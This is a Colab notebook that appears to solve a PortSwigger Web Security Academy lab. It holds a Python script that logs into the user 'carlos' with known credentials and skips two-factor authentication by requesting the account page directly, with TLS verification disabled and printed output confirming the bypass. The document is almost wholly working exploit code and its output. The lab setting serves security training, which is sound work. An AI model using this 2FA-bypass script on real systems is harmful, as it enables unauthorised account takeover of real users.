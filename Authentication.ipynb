{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPjF6xgQAi/bdC9qfPPkgsn",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/himuethic/Authentication-vulnerablily-/blob/main/Authentication.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib3\n",
        "\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "url = 'https://0a3400f203a6da3d81301177007f00e9.web-security-academy.net'\n",
        "\n",
        "def access_carlos_account(s, url):\n",
        "    # Log into Carlos's account\n",
        "    print(\"(+) Logging into Carlos's account and bypassing 2FA verification...\")\n",
        "    login_url = url + \"/login\"\n",
        "    login_data = {\"username\": \"carlos\", \"password\": \"montoya\"}\n",
        "    r = s.post(login_url, data=login_data, allow_redirects=False, verify=False)\n",
        "\n",
        "\n",
        "    myaccount_url = url + \"/my-account\"\n",
        "    r = s.get(myaccount_url, verify=False)\n",
        "    if \"Log out\" in r.text:\n",
        "        print(\"(+) Successfully bypassed 2FA verification.\")\n",
        "    else:\n",
        "        print(\"(-) Exploit failed.\")\n",
        "\n",
        "def main():\n",
        "    s = requests.Session()\n",
        "    access_carlos_account(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "0coEmd2_2KOJ",
        "outputId": "a9fa8f03-bd77-46b5-a57a-25e67b32bce8"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Logging into Carlos's account and bypassing 2FA verification...\n",
            "(+) Successfully bypassed 2FA verification.\n"
          ]
        }
      ]
    }
  ]
}